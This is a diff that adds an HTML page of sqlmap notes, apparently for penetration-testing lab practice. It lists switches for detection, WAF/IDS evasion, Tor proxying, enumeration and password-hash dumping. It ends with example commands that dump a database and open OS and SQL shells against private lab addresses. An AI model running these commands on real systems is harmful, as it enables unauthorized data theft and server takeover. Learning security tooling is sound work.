@@ -1,0 +1,201 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>General</title>
+</head><body><b><span style="font-size: 12pt">GENERAL</span><br/>
+<br/>
+</b><b>Detect database type</b><tt><br/>
+</tt><br/>
+inspect SQL error messages<tt><br/>
+</tt><tt>nmap -sV -sS domain</tt><b><br/>
+</b><b><br/>
+General steps<br/>
+</b><br/>
+1. sqlmap &lt;url with injection point&gt; --identify-waf<br/>
+If identified use --tamper scripts (More details in <tt>/usr/share/sqlmap/tamper/</tt>)<br/>
+2. Compose sqlmap command and --save it to INI file<br/>
+3. Step through Burp site map and &quot;Copy to file&quot; every proper request<br/>
+4. Run sqlmap with -r (request file) and -c (configuration INI file) switches<b><br/>
+</b><b><br/>
+<br/>
+<span style="font-size: 12pt">DETECTION</span><br/>
+<br/>
+<br/>
+Basic switches<br/>
+</b><br/>
+-u 				url<br/>
+-v				Verbosity, 2 for debug messages, 3 for payloads injected<br/>
+--crawl=			crawl depth<br/>
+-p<b>				</b>specify parameter to inject<br/>
+--force-ssl     	Force usage of SSL/HTTPS<br/>
+--random-agent	add random user-agent header (from /usr/share/sqlmap/txt/user-agents.txt)<br/>
+--mobile      	Imitate smartphone through HTTP User-Agent header<br/>
+--batch			disable user interaction during mapping<b><br/>
+</b>--method=		HTTP method<b><br/>
+</b>-r REQUESTFILE  	Load HTTP request from a file<br/>
+--retries=RETRIES  Retries when the connection timeouts (default 3)<br/>
+-s SESSIONFILE   	Load session from a stored (.sqlite) file<br/>
+--flush-session   	Flush session files for current target<br/>
+--save=SAVECONFIG  Save options to a configuration INI file<br/>
+--drop-set-cookie  Ignore Set-Cookie header from response<br/>
+<br/>
+<br/>
+<b>Target details<br/>
+</b><br/>
+--dbms=			specify database type (MySQL &lt;version [5.0]&gt;, Oracle, PostgreSQL, Microsoft SQL Server &lt;version [2005]&gt;, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, HSQLDB, Informix)<br/>
+--os=OS       	Force back-end DBMS operating system to provided value<br/>
+--no-cast      	Turn off payload casting mechanism (use for old MySQL dbs if problems with data retrieval)<b><br/>
+</b><b><br/>
+Timing<br/>
+</b><br/>
+--delay=			delay in seconds between HTTP conections<br/>
+--timeout=TIMEOUT  Seconds to wait before timeout connection (default 30)<br/>
+--time-sec=TIMESEC Seconds to delay the DBMS response (default 5)<b><br/>
+</b><b><br/>
+Proxying<br/>
+</b><br/>
+--proxy=PROXY    Use a proxy to connect to the target URL<br/>
+--proxy-file=PRO.. 	Load proxy list from a file (if any connections detected, sqlmap will use next proxy in list)<br/>
+--tor        		Use Tor anonymity network<br/>
+--check-tor     	Check to see if Tor is used properly<b><br/>
+</b><b><br/>
+IDS bypass<br/>
+</b><br/>
+--identify-waf   		Make a thorough testing for a WAF/IPS/IDS protection<br/>
+--safe-url=SAFEURL 	URL address to visit frequently during testing<br/>
+--safe-post=SAFE.. 	POST data to send to a safe URL<br/>
+--safe-req=SAFER.. 	Load safe HTTP request from a file<br/>
+--safe-freq=SAFE.. 	Test requests between two visits to a given safe URL<br/>
+--skip-urlencode  		Skip URL encoding of payload data<br/>
+--csrf-token=CSR.. 	Parameter used to hold anti-CSRF token<br/>
+--csrf-url=CSRFURL 	URL address to visit to extract anti-CSRF token<br/>
+--tamper=TAMPER   	Use given script(s) for tampering injection data (find scripts in /usr/share/sqlmap/tamper)<br/>
+--hpp        		Use HTTP parameter pollution method (use against ASP/IIS and ASP.NET/IIS platforms)<br/>
+<b><br/>
+Optimization<br/>
+</b><br/>
+--predict-output  	Predict common queries output (use when querying db with blind injection). Not compatible with --threads<br/>
+--keep-alive    	Use persistent HTTP(s) connections<br/>
+--null-connection  	Retrieve page length without actual HTTP response body (Use in blind injection, TRUE or FALSE of injection is evaluated only based on returned page size)<br/>
+--threads=THREADS  Max number of concurrent HTTP(s) requests (default 1) (use more for data retrieval)<b><br/>
+</b><b><br/>
+Injection<br/>
+</b><br/>
+Put asterisk(*) after arbitrary injection point or use %INJECT HERE% style. Mark injection points in request file.<b><br/>
+</b>--dbms=DBMS    Force back-end DBMS to this value<br/>
+<br/>
+<b>Detection<br/>
+</b><br/>
+--level=LEVEL    	Level of tests to perform (1-5, default 1)<b><br/>
+</b>--risk=RISK     	Risk of tests to perform (1-3, default 1)<b><br/>
+</b>--string=STRING   String to match when query is evaluated to True<b><br/>
+</b><b><br/>
+Page comparison for boolean based injection<br/>
+</b><br/>
+--string, --not-string, --regexp, --code, --text-only and --titles<b><br/>
+</b><b><br/>
+Techniques<br/>
+</b><br/>
+--technique=TECH  SQL injection techniques to use (default &quot;BEUSTQ&quot;)<br/>
+B 	Boolean-based blind or simply blind injection<br/>
+E 	Error-based injection<br/>
+U 	UNION-query based injection<br/>
+S 	Stacked queries<br/>
+T 	Time-based injection<br/>
+Q 	Inline queries<br/>
+<br/>
+<b>Risk<br/>
+</b><br/>
+--risk=RISK     	Risk of tests to perform (1-3, default 1) (2 uses heavy time delays, 3 can delete or modify data in db)<b><br/>
+</b><b><br/>
+</b><b>Fingerprinting</b><br/>
+<br/>
+-f, --fingerprint  Perform an extensive DBMS version fingerprint<b><br/>
+</b><b><br/>
+<br/>
+<span style="font-size: 12pt">Enumeration<br/>
+</span><br/>
+</b><br/>
+-D DB        	DBMS database to enumerate (comma separated)<br/>
+-T TBL       	DBMS database table(s) to enumerate (comma separated)<br/>
+-C COL       	DBMS database table column(s) to enumerate (comma separated)<br/>
+-a, --all      		Retrieve everything<br/>
+-b, --banner    	Retrieve DBMS banner<br/>
+--current-user   	Retrieve DBMS current user<br/>
+--current-db    	Retrieve DBMS current database<br/>
+--users       	Enumerate DBMS users<br/>
+--passwords     	Enumerate DBMS users password hashes<br/>
+--privileges    	Enumerate DBMS users privileges<br/>
+--roles       	Enumerate DBMS users roles<br/>
+--dbs        	Enumerate DBMS databases<br/>
+--tables      	Enumerate DBMS database tables<br/>
+--columns      	Enumerate DBMS database table columns<br/>
+--schema      	Enumerate DBMS schema<ul><li style="list-style-type: none">--exclude-sysdbs	Exclude all system databases</li>
+</ul>
+--count       	Retrieve number of entries for table(s)<br/>
+--dump       	Dump DBMS database table entries<ul><li style="list-style-type: none">-C, -T, -D, --start, --stop, --first, --last</li>
+</ul>
+--dump-all     	Dump all DBMS databases tables entries<br/>
+--search      	Search column(s), table(s) and/or database name(s)<br/>
+--comments     	Retrieve DBMS comments<br/>
+--sql-shell     	Prompt for an interactive SQL shell<br/>
+--sql-query		Run arbitrary SQL statement<b><br/>
+</b><b><br/>
+Brute force<br/>
+</b><br/>
+--common-tables   	Check existence of common tables<br/>
+--common-columns  	Check existence of common columns<b><br/>
+</b><b><br/>
+System access<br/>
+</b><br/>
+--privileges			Check privileges for current user<b><br/>
+</b>--file-read=RFILE  		Read a file from the back-end DBMS file system (need FILE privilege)<br/>
+--file-write=WFILE 	Write a local file on the back-end DBMS file system (need FILE privilege)<br/>
+--os-cmd=OSCMD   	Execute an operating system command<br/>
+--os-shell     		Prompt for an interactive operating system shell<br/>
+--os-pwn      		Prompt for an OOB shell, Meterpreter or VNC ??????????????????????<br/>
+--os-bof      		Stored procedure buffer overflow exploitation<br/>
+--priv-esc     		Database process user privilege escalation<br/>
+<b><br/>
+<br/>
+<span style="font-size: 12pt">EXAMPLES</span><br/>
+<br/>
+<br/>
+DISCOVERY<br/>
+<br/>
+Search for SQLi<br/>
+</b><tt><br/>
+sqlmap -u http://10.11.1.35 --crawl=1<br/>
+<br/>
+</tt><b>POST request switch<br/>
+</b><tt><br/>
+sqlmap -u http://10.11.13.67:80/comment.php?id=738 --data=&quot;username=test&amp;password=test&quot;<br/>
+<br/>
+</tt><b>Requests with cookies switch</b><tt><br/>
+</tt><tt><br/>
+sqlmap -u http://10.11.13.67:80/comment.php?id=738 --cookie=&quot;PHPSESSID=ckleiuvrv60fs012hlj72eeh37&quot;<br/>
+<br/>
+</tt><b>Inject custom headers<br/>
+</b><tt><br/>
+--headers=&quot;User-Agent:test*\nReferer:bla&quot;<br/>
+<br/>
+</tt><b>URI injection point(mark with *)<br/>
+</b><tt><br/>
+</tt><tt>&quot;http://targeturl/param1/<b>value1*</b>/param2/value2/&quot;</tt><b><br/>
+</b><b><br/>
+<br/>
+EXPLOITATION<br/>
+<br/>
+</b><b>Dump the db through discovered SQLi</b><tt><br/>
+</tt><tt><br/>
+sqlmap -u http://10.11.13.67:80/comment.php?id=738 --dbms=mysql --dump --threads=5<br/>
+<br/>
+</tt><b>Get shell<br/>
+</b><tt>sqlmap -u http://10.11.13.67:80/comment.php?id=738 --dbms=mysql --os-shell<br/>
+<br/>
+</tt><b>Get DB shell</b><tt><br/>
+</tt><tt>sqlmap -u http://10.11.13.67:80/comment.php?id=738 --dbms=mysql --sql-shell<br/>
+<br/>
+</tt>L<b>ist tables from specified database</b><tt><br/>
+</tt><tt>sqlmap -u http://10.11.13.67:80/comment.php?id=738 -D database --tables<br/>
+</tt></body></html>
